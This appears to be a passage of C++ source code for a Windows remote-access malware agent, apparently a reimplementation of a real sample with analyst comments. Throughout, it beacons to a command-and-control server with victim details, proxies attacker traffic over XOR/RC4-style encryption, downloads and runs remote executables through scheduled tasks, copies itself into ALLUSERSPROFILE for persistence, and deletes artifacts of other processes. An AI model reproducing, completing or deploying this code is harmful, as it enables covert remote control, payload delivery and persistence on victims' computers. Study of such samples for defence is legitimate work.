{
	int port = 80;
	bool use_tls = false;
	const char *service{};
	const char *filepath{};
	const char *host{};
	const char *p = url;
	char buf[124] = {0};
	int result = 0;

	if (url[4] == 's' || url[4] == 'S')
	{
		use_tls = true;
		port = 443;
	}

	size_t i = strlen(url);

	while (i > 0)
	{
		if (*(uint16_t *)p == '//')
		{
			host = p + 2;
			i -= 2;
			p += 2;

			while (i > 0)
			{
				if (*p == ':')
				{
					service = p;
				}

				if (*p == '/')
				{
					break;
				}

				p++;
				i--;
			}

			filepath = p;

			if (service)
			{
				memcpy(buf, service + 1, filepath - (service + 1));
				port = atoi(buf);
			}

			memcpy(&buf[8], host, service - host);

			if (use_tls)
			{
				result = net_tls_download_file(&buf[8], port, filepath, filebufp);
			}

			else
			{
				result = net_http_download_file(&buf[8], port, filepath, filebufp);
			}

			break;
		}

		p++;
		i--;
	}

	return result;
}

void crypto(uint8_t *key, size_t key_size, uint8_t *data, size_t data_size)
{
	uint32_t a = 0xFFFEFDFC;
	uint8_t state[256] = {0};

	for (int i = 63; i >= 0; i--)
	{
		((uint32_t *)state)[i] = a;
		a -= 0x4040404;
	}

	uint8_t b = 0;
	for (size_t i = 0, j = 0; i < 256; i++, j++)
	{
		b += state[i] + key[j % key_size];
		utils_swap(state[b], state[i]);
	}

	// This should have been done earlier Mr. Hacker
	if (!data_size)
	{
		return;
	}

	uint8_t x = 0;
	uint8_t y = 1;
	for (size_t i = 0; i < data_size; i++)
	{
		x += state[y];
		uint8_t kb = state[x] + state[y];
		data[i] ^= state[kb];
		utils_swap(state[x], state[y]);
		y += 1;
	}
}

void agent_create_persistance_directory(char *path, char *infection_id)
{
	size_t dirpathln = GetEnvironmentVariableA("ALLUSERSPROFILE", path, 0x100);
	path[dirpathln] = '\\';
	rand_get_string(&path[dirpathln + 1]);
	CreateDirectoryA(path, nullptr);
	strcpy(&path[strlen(path)], infection_id);
	strcpy(&path[strlen(path)], ".exe");
}

DWORD WINAPI agent_proxy_routine(LPVOID lpThreadParameter)
{
	proxy_context_t *proxy_context{};
	HANDLE *threads{};
	uint8_t socket_index{};
	HANDLE event{};
	SOCKET *sockets{};
	sockaddr_in addr4{};
	sockaddr_in6 addr6{};
	tcp_keepalive tcp_keepalive{};
	socket_set_t socket_set{};
	DWORD bytes_rt{};
	WSAOVERLAPPED ov{};

	proxy_context = (proxy_context_t *)lpThreadParameter;
	threads = proxy_context->threads;
	socket_index = proxy_context->socket_index;
	event = proxy_context->event;
	sockets = proxy_context->sockets;
	SOCKET proxy_socket = sockets[socket_index];
	SOCKET main_socket = sockets[MAIN_SOCKET];

	switch (proxy_context->control.addr_type)
	{
	case address_type_t::IPv4:
	{
		auto &ip4_connect = proxy_context->control.payload.ip4_connect;
		addr4.sin_family = AF_INET;
		addr4.sin_addr.s_addr = ip4_connect.ipv4;
		addr4.sin_port = ip4_connect.port;
	}
	break;

	case address_type_t::IPv6:
	{
		auto &ip6_connect = proxy_context->control.payload.ip6_connect;
		memcpy(&addr6.sin6_addr, ip6_connect.ipv6, sizeof(ip6_connect.ipv6));
		addr6.sin6_family = AF_INET6;
		addr6.sin6_port = ip6_connect.port;
	}
	break;

	case address_type_t::Domain:
	{
		auto &domain_connect = proxy_context->control.payload.domain_connect;
		uint16_t port = *(uint16_t *)(domain_connect.domain + domain_connect.domain_name_len);
		domain_connect.domain[domain_connect.domain_name_len] = '\x00';
		addr4.sin_addr = net_dns_resolve((const char *)domain_connect.domain, AF_INET);
		addr4.sin_port = port;
	}
	break;
	}

	u_long nonblocking = 1;
	ioctlsocket(proxy_socket, FIONBIO, &nonblocking);

	if (proxy_context->control.addr_type == address_type_t::IPv4)
	{
		connect(proxy_socket, (const sockaddr *)&addr4, sizeof(sockaddr_in));
	}

	else
	{
		connect(proxy_socket, (const sockaddr *)&addr6, sizeof(sockaddr_in6));
	}

	net_socket_init(main_socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});

	if (select(0, nullptr, (fd_set *)&socket_set, nullptr, &socket_set.timeout))
	{
		nonblocking = 0;
		ioctlsocket(main_socket, FIONBIO, &nonblocking);

		tcp_keepalive.onoff = 1;
		tcp_keepalive.keepalivetime = SECONDS(600);
		tcp_keepalive.keepaliveinterval = SECONDS(10);

		WSAIoctl(
			main_socket,
			SIO_KEEPALIVE_VALS,
			&tcp_keepalive,
			sizeof(tcp_keepalive),
			nullptr,
			0,
			&bytes_rt,
			&ov,
			nullptr);

		// <socket> <length> <data>
		uint8_t connection_confirmation_packet[] = {
			socket_index,
			0x0A, 0x00,
			0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

		crypto(g_xor_key, sizeof(g_xor_key), connection_confirmation_packet, 3);
		crypto(g_xor_key, sizeof(g_xor_key), connection_confirmation_packet + 3, 0x0A);

		net_socket_send(main_socket, connection_confirmation_packet, sizeof(connection_confirmation_packet), event);

		crypto(g_xor_key, sizeof(g_xor_key), connection_confirmation_packet, 3);
		crypto(g_xor_key, sizeof(g_xor_key), connection_confirmation_packet + 3, 0x0A);

		uint8_t *packet_buffer = (uint8_t *)proxy_context + 3;

		while (sockets[socket_index] != 0)
		{
			net_socket_init(proxy_socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});
			int ready = select(0, (fd_set *)&socket_set, nullptr, nullptr, &socket_set.timeout);

			if (ready == 0)
			{
				continue;
			}

			if (ready < 0)
			{
				break;
			}

			int n = net_socket_recv(proxy_socket, packet_buffer + 3, 0xFFFA, 10);

			if (n <= 0)
			{
				break;
			}

			auto data_response = (data_packet_response_t *)packet_buffer;
			data_response->socket_index = socket_index;
			data_response->length = n;

			crypto(g_xor_key, sizeof(g_xor_key), (uint8_t *)data_response, 3);
			crypto(g_xor_key, sizeof(g_xor_key), data_response->data, n);

			net_socket_send(main_socket, data_response, sizeof(data_packet_response_t) - 1 + n, event);
		}
	}

	net_socket_close(sockets[socket_index]);
	uint8_t connection_closed_confirmation_packet[] = {socket_index, 0x00, 0x00};
	crypto(g_xor_key, sizeof(g_xor_key), connection_closed_confirmation_packet, sizeof(connection_closed_confirmation_packet));
	net_socket_send(main_socket, connection_closed_confirmation_packet, sizeof(connection_closed_confirmation_packet), event);
	VirtualFree(proxy_context, 0, MEM_RELEASE);
	threads[socket_index] = nullptr;

	return 0;
}

int agent_main_loop(char *addr, uint16_t port)
{
	HANDLE event{};
	uint8_t *buffer{};
	SOCKET main_socket{};
	sockaddr_in c2_addr{};
	char *ip{};
	socket_set_t socket_set;
	tcp_keepalive tcp_keepalive{};
	DWORD bytes_rt{};
	WSAOVERLAPPED ov{};
	char username[256]{};
	hello_packet_t *hello_packet{};
	size_t remaining_bytes{};
	size_t pos{};
	SOCKET sockets[200]{};
	HANDLE threads[200]{};

	event = CreateEventA(nullptr, false, true, nullptr);
	buffer = (uint8_t *)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	main_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockets[MAIN_SOCKET] = main_socket;

	int optval = 1;
	setsockopt(main_socket, IPPROTO_TCP, TCP_NODELAY, (const char *)&optval, sizeof(optval));

	c2_addr.sin_port = htons(port);
	c2_addr.sin_family = AF_INET;

	if (!strings_end_with_a_number(addr))
	{
		ip = inet_ntoa(net_dns_resolve(addr, AF_INET));
	}
	else
	{
		ip = addr;
	}

	c2_addr.sin_addr.s_addr = inet_addr(ip);

	u_long nonblocking = 1;
	ioctlsocket(main_socket, FIONBIO, &nonblocking);
	connect(main_socket, (const sockaddr *)&c2_addr, sizeof(c2_addr));

	net_socket_init(main_socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});
	if (select(0, nullptr, (fd_set *)&socket_set, nullptr, &socket_set.timeout) != 1)
	{
		goto close_conn;
	}

	nonblocking = 0;
	ioctlsocket(main_socket, FIONBIO, &nonblocking);

	tcp_keepalive.onoff = 1;
	tcp_keepalive.keepalivetime = SECONDS(600);
	tcp_keepalive.keepaliveinterval = SECONDS(10);
	WSAIoctl(
		main_socket,
		SIO_KEEPALIVE_VALS,
		&tcp_keepalive,
		sizeof(tcp_keepalive),
		nullptr,
		0,
		&bytes_rt,
		&ov,
		nullptr);

	hello_packet = (hello_packet_t *)buffer;

	*(ULONG *)buffer = 0x100;
	GetUserNameExA(NameSamCompatible, hello_packet->username, (PULONG)buffer);
	memcpy(buffer, g_xor_key, sizeof g_xor_key);
	*(ULONG *)hello_packet->windows_build_number = windows_get_build_number();
	hello_packet->is_wow64 = windows_is_wow64();
	GetVolumeInformationA(
		nullptr,
		nullptr,
		0,
		(LPDWORD)&hello_packet->volume_serial_number,
		nullptr,
		nullptr,
		nullptr,
		0);

	crypto(g_xor_key, sizeof(g_xor_key), (uint8_t *)&hello_packet->windows_build_number, sizeof(hello_packet_t) - sizeof(g_xor_key));
	net_socket_send(main_socket, (uint8_t *)hello_packet, sizeof(hello_packet_t), nullptr);

	for (;;)
	{
		net_socket_init(main_socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});

		int ready_sockets = select(0, (fd_set *)&socket_set, nullptr, nullptr, &socket_set.timeout);

		if (ready_sockets < 0)
		{
			goto close_conn;
		}

		else if (ready_sockets == 0)
		{
			if (remaining_bytes != 0 || pos != 0)
			{
				goto close_conn;
			}

			continue;
		}

		packet_header_t *packet_header{};

		if (remaining_bytes == 0)
		{
			int n = net_socket_recv(sockets[MAIN_SOCKET], buffer + pos, 4 - pos, 10);

			if (n <= 0)
			{
				goto close_conn;
			}

			pos += n;

			if (pos == 4)
			{
				pos = 0;

				crypto(g_xor_key, sizeof g_xor_key, buffer, sizeof(packet_header_t));

				packet_header = (packet_header_t *)buffer;

				if (packet_header->length == 0)
				{
					sockets[packet_header->socket_index] = 0;
					continue;
				}

				int n = net_socket_recv(sockets[MAIN_SOCKET], buffer + sizeof(packet_header_t), packet_header->length, 10);

				if (n <= 0)
				{
					goto close_conn;
				}

				remaining_bytes = packet_header->length - n;
			}
		}

		else
		{
			packet_header = (packet_header_t *)buffer;
			int n = net_socket_recv(main_socket, &buffer[packet_header->length - remaining_bytes], remaining_bytes, 10);

			if (n <= 0)
			{
				goto close_conn;
			}

			remaining_bytes -= n;
		}

		if (remaining_bytes != 0 || pos != 0 || packet_header->length == 0)
		{
			continue;
		}

		crypto(g_xor_key, sizeof g_xor_key, buffer + sizeof(packet_header_t), packet_header->length);

		if (packet_header->value == 0xFFFF)
		{
			auto file_download = &((control_packet_t *)buffer)->payload.file_download;
			file_download->url[packet_header->length] = '\x00';

			void *filedata = {};
			size_t filesize = net_download_file((char *)file_download->url, &filedata);

			auto response = (file_download_response_t *)buffer + 1;
			response->length = 4;
			response->file_download_id = ((control_packet_t *)buffer)->file_download_id;
			crypto(g_xor_key, sizeof(g_xor_key), (uint8_t *)response, sizeof(file_download_response_t));
			net_socket_send(main_socket, (void *)response, sizeof(file_download_response_t), event);

			auto filepath = buffer;
			int filepathlen = GetTempPathA(512, (LPSTR)filepath);
			int filenamelen = rand_get_string((char *)&filepath[filepathlen]);
			filepathlen += filenamelen;
			strcpy((char *)&filepath[filepathlen], ".exe");
			fs_create_file((char *)filepath, filedata, filesize, CREATE_ALWAYS, FILE_BEGIN);

			char *task_name = (char *)&buffer[512];
			rand_get_string(task_name);

			windows_ts_create_task(task_name, (char *)filepath, nullptr, true, false);
		}

		else if (packet_header->established_connection)
		{
			auto data_packet = (data_packet_t *)buffer;
			net_socket_send(sockets[packet_header->socket_index], data_packet->data, data_packet->header.length, 0);
		}

		else
		{
			auto control_packet = (control_packet_t *)buffer;
			auto proxy_context = (proxy_context_t *)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			memcpy(proxy_context, buffer, 0x180);

			auto socket_index = control_packet->header.socket_index;
			auto &new_socket = sockets[socket_index];

			proxy_context->threads = threads;
			proxy_context->socket_index = socket_index;
			proxy_context->event = event;
			proxy_context->sockets = sockets;
			proxy_context->self = proxy_context;

			if (proxy_context->control.addr_type == address_type_t::IPv6)
			{
				new_socket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
			}
			else
			{
				new_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			}

			int nonblocking = 1;
			setsockopt(new_socket, FIONBIO, 1, (const char *)&nonblocking, sizeof(nonblocking));
			threads[socket_index] = CreateThread(nullptr, 0, agent_proxy_routine, proxy_context, 0, nullptr);
		}
	}

close_conn:

	net_socket_close(sockets[MAIN_SOCKET]);

	for (size_t i = 0; i < ArraySize(sockets); i++)
	{
		sockets[i] = 0;
	}

	ResetEvent(event);
	CloseHandle(event);
	VirtualFree(buffer, 0, MEM_RELEASE);

	return 0;
}

LRESULT WINAPI agent_window_proc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	if (Msg == SHUTDOWN_AGENT)
	{
		windows_ts_delete_task(g_infection_id);
		WSACleanup();
	}

	return DefWindowProcA(hWnd, Msg, wParam, lParam);
}

int strings_wstring_bytecount(const wchar_t *s)
{
	wchar_t *p = (wchar_t *)s;
	while (*s++ != 0)
		;
	return (char *)s - (char *)p - 2;
}

int strings_compare_wide(const wchar_t *s1, const wchar_t *s2)
{
	int len = strings_wstring_bytecount(s1);

	if (memcmp(s2, s1, len))
	{
		return 0;
	}

	return len;
}

bool strings_str_equal(const char *s1, const char *s2)
{
	int ln = strlen(s1);

	if (ln != strlen(s2))
	{
		return false;
	}

	while (ln != 0)
	{
		if (*s1 != *s2)
		{
			return false;
		}

		ln -= 1;
		s1++;
		s2++;
	}

	return true;
}

int cmd_argument_exists(const char *arg)
{
	int argcount = 0;
	wchar_t cmdarg[128] = {0};
	auto command_line = GetCommandLineW();
	auto args = CommandLineToArgvW(command_line, &argcount);

	if (argcount > 1)
	{
		strings_convert_str8_to_str16((char *)arg, (char *)cmdarg);
		return strings_compare_wide(args[1], cmdarg);
	}

	return 0;
}

BOOL WINAPI agent_remove_artifacts(HWND hwnd, LPARAM lParam)
{
	DWORD pid = {};
	char buffer[256] = {0};
	char window_name[256] = {0};

	GetWindowThreadProcessId(hwnd, &pid);

	if (pid == GetCurrentProcessId())
	{
		return true;
	}

	GetClassNameA(hwnd, buffer, sizeof(buffer));
	GetWindowTextA(hwnd, window_name, sizeof(window_name));

	if (strings_str_equal(buffer, "win32app"))
	{
		if (strings_str_equal(window_name, "Microsoft"))
		{
			HANDLE proch = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);

			if (GetModuleFileNameExA(proch, nullptr, buffer, sizeof(buffer)))
			{
				Sleep(SECONDS(1));
				DeleteFileA(buffer);

				int i = strlen(buffer);
				while (--i)
				{
					if (buffer[i] == '\\')
					{
						buffer[i] = 0;
						RemoveDirectoryA(buffer);
						return true;
					}
				}
			}
		}
	}

	return true;
}

void agent_connect_to_c2()
{
	WSADATA wsd{};

	do
	{
		// Sleep(MINUTES(1));
	} while (WSAStartup(MAKEWORD(2, 2), &wsd));

	char *ip = g_config.Host1 + 6;
	int port = atoi((char *)g_config.Port1 + 6);

	while (agent_main_loop(ip, port) < 0)
	{
		if (ip == g_config.Host1 + 6)
		{
			ip = g_config.Host2 + 6;
		}

		else
		{
			ip = g_config.Host1 + 6;
		}

		Sleep(MINUTES(3));
	}
}

DWORD windows_get_process_integrity_level()
{
	HANDLE token{};
	DWORD rsize{};
	DWORD sidsub = 0;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
	{
		return 0;
	}

	auto token_mandatory_level = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_MANDATORY_LABEL));
	GetTokenInformation(token, (_TOKEN_INFORMATION_CLASS)TokenIntegrityLevel, token_mandatory_level, sizeof(TOKEN_MANDATORY_LABEL), &rsize);

	if (rsize > 8)
	{
		LocalFree(token_mandatory_level);
		token_mandatory_level = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LMEM_FIXED, rsize);

		if (!GetTokenInformation(token, (_TOKEN_INFORMATION_CLASS)TokenIntegrityLevel, token_mandatory_level, rsize, &rsize))
		{
			goto ret;
		}
	}

	sidsub = *GetSidSubAuthority(token_mandatory_level->Label.Sid, 0);

ret:
	LocalFree(token_mandatory_level);
	CloseHandle(token);
	return sidsub;
}

int main()
{
	CreateThread(nullptr, 0, agent_create_window, agent_window_proc, 0, nullptr);

	auto start2_arg_exists = cmd_argument_exists("start2");
	char *infection_id;
	if (start2_arg_exists)
	{
		auto entry = (PLDR_DATA_TABLE_ENTRY)(NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink);
		auto exename = entry->BaseDllName.Buffer;
		size_t i = 0;

		infection_id = g_infection_id;
		while (exename[i] != '.')
		{
			infection_id[i] = exename[i];
			i++;
		}
	}
	else
	{
		infection_id = g_infection_id;
		rand_get_string(infection_id);
	}

	CreateMutexA(nullptr, false, g_infection_id);

	// if start2 argument is present connect to c2,
	// else create scheduled task of the same file and exit.

	if (start2_arg_exists)
	{
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			goto exit;
		}
		else
		{
			goto persist;
		}
	}

	else
	{
		EnumWindows(agent_remove_artifacts, 0);
		// Sleep(SECONDS(10));

		// Low Integrity Process like Browsers, unsure if what was the use ?
		// was it injected into browsers before ? but also doing so is desired because
		// a low integrity process can't create schedualed tasks.
		if (windows_get_process_integrity_level() == 4096)
		{
			agent_connect_to_c2();
		}

	persist:
		if (windows_is_process_running("a2guard.exe"))
		{
			char binary_path[0x100] = {0};
			char taskpath[0x100] = {0};
			GetModuleFileNameA(nullptr, binary_path, 0x100);
			agent_create_persistance_directory(taskpath, infection_id);
			CopyFileA(binary_path, taskpath, false);
			windows_ts_create_task(infection_id, taskpath, (char *)"start2", false, true);
		}
	}

exit:
	Sleep(SECONDS(60));
	ExitProcess(0);
}